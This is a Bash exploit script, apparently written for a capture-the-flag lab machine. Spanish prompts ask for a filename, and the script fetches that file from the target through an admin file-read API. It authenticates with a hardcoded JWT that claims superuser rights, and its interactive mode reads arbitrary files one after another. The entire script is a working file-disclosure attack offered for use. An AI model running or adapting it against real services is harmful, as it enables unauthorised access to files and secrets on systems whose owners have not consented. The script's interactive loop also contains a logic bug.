#!/bin/bash

# Patelata de colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"



# ctrl + c
trap ctrl_c INT


function ctrl_c(){
  echo -e "\n\n${redColour}[!]${endColour} ${grayColour}Saliendo...${endColour}\n"
  exit 1
}

function helpPanel(){
  echo -e "\n${yellowColour}[?] ${grayColour}Uso:${endColour}\n"
  echo -e "\t${purpleColour}f)${endColour}${grayColour} Nombre del fichero${endColour}"
  echo -e "\t${purpleColour}h)${endColour}${grayColour} Muestra este panel de ayuda${endColour}"

}

function getFile(){
  filename=$1
  echo; curl -s -X GET "http://10.10.11.162/api/v1/admin/file/$(echo -n $filename | base64)" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjg4MjI5Nzc4LCJpYXQiOjE2ODc1Mzg1NzgsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiNTZkNDMxYmUtMWQwMS00MTk3LWI2ODctZTU4ZWFlMTUyMjJlIn0.9c2pJek8Kldi3qJG-53F1c5wthJhbTallYrfPfTAEsY" | jq '.file' -r 
}

function interactivePanel(){
  while [ myFile != "exit" ]; do
    echo -en "\n${yellowColour}[?] ${grayColour}Nombre del fichero: ${endColour}" && read filename
    getFile $filename
  done
}

parameter_counter=0
while getopts "f:hi" arg; do
  case $arg in
    f) filename=$OPTARG; let parameter_counter+=1;;
    i) interactivePanel; let parameter_counter+=2;;
    h) helpPanel;;
  esac
done

if [ $parameter_counter -eq 1 ]; then

  getFile $filename

elif [ $parameter_counter -eq 2 ]; then

  interactivePanel

else
  helpPanel
fi
